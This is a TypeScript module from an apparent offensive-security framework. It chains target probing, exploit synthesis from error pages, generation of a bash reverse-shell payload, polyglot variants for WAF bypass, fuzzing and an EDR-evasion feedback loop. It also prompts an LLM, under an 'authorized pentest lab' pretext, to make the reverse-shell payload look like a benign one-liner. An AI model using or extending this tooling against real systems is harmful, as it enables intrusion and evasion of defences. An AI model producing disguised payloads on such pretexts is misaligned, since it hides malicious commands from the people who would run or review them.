/**
 * @module ares/ai_ml_attacks
 * AI/ML attacks — exploit synthesis, EDR feedback loop, LLM mutation, fuzz pipeline.
 */
import { synthesizeFromIndicator, generatePolyglotPayloads } from "../exploit_synthesis.ts"
import { runEdrFeedbackLoop } from "../edr_feedback_loop.ts"
import { runZeroDayFuzzer } from "./zero_day_fuzzer.ts"
import { PayloadGenerator } from "../toolkit.ts"
import { llmComplete, hasLLMKey } from "../llm_client.ts"
import { brokerExec, liveRequired, writeArtifact } from "./_base.ts"
import { step, type ExecStep } from "./_integrations.ts"

export interface AiMlAttackResult {
  capabilities: string[]
  artifacts: string[]
  steps: ExecStep[]
  probed: boolean
  summary: string
}

export async function runAiMlAttacks(opts: {
  live?: boolean
  targetUrl?: string
  llmEndpoint?: string
}): Promise<AiMlAttackResult> {
  liveRequired("ares_ai_ml_attacks", opts)
  const targetUrl = opts.targetUrl ?? "http://127.0.0.1:8080"
  const capabilities: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  let probed = false

  const r = await brokerExec(`curl -s -m 8 ${targetUrl} 2>&1 | head -c 800`)
  steps.push(step("target_probe", r.ok, r.out.slice(0, 300)))
  if (r.ok) probed = true

  const errorBody = r.out || "<html>500 Internal Server Error</html>"
  const synth = await synthesizeFromIndicator(targetUrl, errorBody, { live: true })
  writeArtifact("ai_ml", "synthesis.json", JSON.stringify(synth, null, 2))
  steps.push(step("exploit_synthesis", synth.errorHints.length > 0, synth.recommendedModule ?? "none"))
  capabilities.push("adaptive_payload_generation", "error_page_synthesis")

  const basePayload = new PayloadGenerator().generate("reverse_shell", "bash").code
  const polyglots = generatePolyglotPayloads(basePayload)
  writeArtifact("ai_ml", "polyglots.json", JSON.stringify(polyglots, null, 2))
  capabilities.push("polyglot_waf_bypass")

  const fuzz = await runZeroDayFuzzer({ live: true, target: "echo", rounds: 12 })
  steps.push(step("fuzz_ai_pipeline", fuzz.iterations > 0, fuzz.summary))
  capabilities.push("fuzz_ai_vuln_discovery")

  const edrLoop = await runEdrFeedbackLoop({ live: true, maxIterations: 2 })
  writeArtifact("ai_ml", "edr_feedback.json", JSON.stringify(edrLoop, null, 2))
  steps.push(step("adaptive_evasion", edrLoop.iterations.length > 0, edrLoop.summary))
  capabilities.push("adaptive_evasion")

  if (hasLLMKey()) {
    try {
      const llm = await llmComplete(`Generate a benign-looking bash one-liner for authorized pentest lab: ${basePayload.slice(0, 80)}`, { maxTokens: 200 })
      writeArtifact("ai_ml", "llm_payload.txt", llm.content)
      steps.push(step("llm_payload_mutation", llm.content.length > 0, llm.content.slice(0, 200)))
      capabilities.push("llm_social_engineering")
      probed = true
    } catch (err) {
      steps.push(step("llm_payload_mutation", false, String((err as Error).message)))
    }
  } else if (opts.llmEndpoint) {
    const lr = await brokerExec(`curl -s -m 5 ${opts.llmEndpoint}/api/tags 2>&1 | head -c 500`)
    steps.push(step("llm_endpoint_probe", lr.ok, lr.out.slice(0, 200)))
    probed = probed || lr.ok
  }

  writeArtifact("ai_ml", "defender_model.json", JSON.stringify({
    signals: ["edr_alert", "siem_correlation", "sandbox_detonation"],
    rotation: edrLoop.finalChannel,
  }, null, 2))

  return {
    capabilities,
    artifacts,
    steps,
    probed,
    summary: `AI/ML attacks: ${capabilities.length} capability(ies), ${steps.filter((s) => s.success).length}/${steps.length} steps ok`,
  }
}

export default { runAiMlAttacks }
